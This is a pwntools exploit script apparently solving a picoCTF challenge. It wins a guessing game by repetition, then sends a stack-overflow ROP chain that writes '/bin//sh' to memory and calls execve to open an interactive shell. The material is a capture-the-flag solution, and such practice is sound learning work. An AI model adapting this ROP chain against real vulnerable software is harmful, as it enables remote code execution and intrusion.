from pwn import *
from struct import pack

elf = context.binary = ELF("./vuln")
host, port = "jupiter.challenges.picoctf.org", 51462

# conn = elf.process()
conn = remote(host, port)

conn.recvuntil(b"guess?\n")
conn.sendline(b"50")
res = conn.recvline()

while b"Nope" in res:
    conn.recvuntil(b"guess?\n")
    conn.sendline(b"50")
    res = conn.recvline()

# conn.recvuntil(b"Name?\n")

# Padding goes here
p = b"A" * 120
p += pack("<Q", 0x00000000004163F4)  # pop rax ; ret
p += b"/bin//sh"
p += pack("<Q", 0x0000000000410CA3)  # pop rsi ; ret
p += pack("<Q", 0x00000000006BA0E0)  # @ .data
p += pack("<Q", 0x000000000047FF91)  # mov qword ptr [rsi], rax ; ret
p += pack("<Q", 0x00000000004163F4)  # pop rax ; ret
p += p64(0x3B)
p += pack("<Q", 0x0000000000400696)  # pop rdi ; ret
p += pack("<Q", 0x00000000006BA0E0)  # @ .data
p += pack("<Q", 0x0000000000410CA3)  # pop rsi ; ret
p += p64(0x0)
p += p64(0x44A6B5)  # pop rdx ; ret
p += p64(0x0)
p += pack("<Q", 0x000000000040137C)  # syscall

conn.sendline(p)

conn.interactive()
